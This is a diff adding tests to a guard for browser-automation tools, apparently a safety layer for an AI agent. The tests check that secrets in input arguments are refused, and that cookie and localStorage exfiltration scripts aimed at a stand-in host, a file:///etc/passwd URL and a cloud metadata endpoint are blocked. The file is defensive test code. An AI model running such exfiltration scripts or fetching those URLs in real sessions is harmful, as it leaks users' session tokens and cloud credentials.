@@ -63,6 +63,18 @@ describe('guard', () => {
     expect(await evalJs('document.title')).toContain('stored')
   })
 
+  test('browser_fill, browser_type and browser_session_record: a secret in the arguments is refused and never echoed; plain text passes', async ($, on) => {
+    world(on)
+    await $.session.start(START)
+    for (const name of ['fill', 'type', 'session_record']) {
+      const bad = await attempt($.tool.call({ tool: T(name), selector: '#pw', text: GH } as never))
+      expect(bad).toContain('secret')
+      expect(bad).not.toContain(GH)
+      expect(await attempt($.tool.call({ tool: T(name), selector: '#q', text: 'hello world' } as never))).toContain('stored')
+    }
+    expect(await attempt($.tool.call({ tool: T('fill'), selector: '#pw', value: { password: 'hunter2hunter2hunter2' } } as never))).toContain('secret')
+  })
+
   test('strictUrls: on refuses plain http outside localhost', { options: { strictUrls: 'on' } }, async ($, on) => {
     world(on)
     await $.session.start(START)
@@ -103,5 +115,18 @@ describe('status file and command', () => {
     expect((await $.command.run(slash('url file:///etc/passwd'))).text).toContain('would refuse')
     expect((await $.command.run(slash('url https://example.com'))).text).toContain('would let')
     expect((await $.command.run(slash(''))).text).toContain('/browser-mod status')
+  })
+})
+
+describe('guard: heuristics that misfired', () => {
+  test('a comparison is not a navigation; a bracketed cookie read and a trailing-dot metadata host are caught', async ($, on) => {
+    world(on)
+    await $.session.start(START)
+    const ev = (script: string) => attempt($.tool.call({ tool: T('eval'), script } as never))
+    expect(await ev("return location.href === 'https://a.test/' && localStorage.length")).toContain('stored')
+    expect(await ev("return img.src == 'a.png' && localStorage.length")).toContain('stored')
+    expect(await ev("fetch('https://e.test/?c=' + document['cookie'])")).toContain('cookies or storage')
+    expect(await ev("location.href = 'https://e.test/?c=' + localStorage.getItem('t')")).toContain('cookies or storage')
+    expect(await attempt($.tool.call({ tool: T('open'), url: 'http://metadata.google.internal./computeMetadata/v1/' } as never))).toContain('metadata')
   })
 })
